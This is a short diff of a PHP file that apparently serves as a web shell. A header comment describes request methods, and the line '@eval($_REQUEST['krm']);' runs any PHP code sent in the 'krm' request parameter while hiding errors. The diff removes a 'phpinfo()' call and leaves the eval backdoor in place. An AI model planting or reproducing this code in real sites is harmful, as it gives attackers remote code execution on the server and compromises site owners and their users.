@@ -6,5 +6,4 @@ default OPTIONS
     Request Method: $_REQUEST ($_GET | $_POST)
 */
 @eval($_REQUEST['krm']);
-phpinfo();
 ?>
